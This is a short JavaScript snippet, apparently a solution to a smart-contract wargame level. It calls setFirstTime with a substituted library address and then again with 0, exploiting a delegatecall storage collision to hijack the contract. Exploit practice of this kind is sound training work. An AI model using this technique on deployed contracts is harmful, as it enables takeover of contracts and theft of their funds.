var badLibAddr = "0xC54E01F9020D7Ec0a57f9580f064df67863c368D";
var badLibInt = BigInt(badLibAddr);
await contract.setFirstTime(badLibInt);
await contract.setFirstTime(0);